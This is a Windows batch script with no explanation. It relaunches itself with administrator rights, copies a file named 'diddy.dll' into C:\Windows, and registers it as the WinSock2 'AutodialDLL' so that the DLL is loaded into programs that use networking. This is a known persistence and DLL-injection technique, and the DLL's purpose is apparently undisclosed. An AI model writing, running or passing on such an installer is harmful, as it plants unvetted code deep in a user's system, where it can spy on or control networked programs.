@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Restarting with admin rights...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

move /Y "diddy.dll" "C:\Windows\"

reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\diddy.dll" /F

echo Operation completed successfully.
pause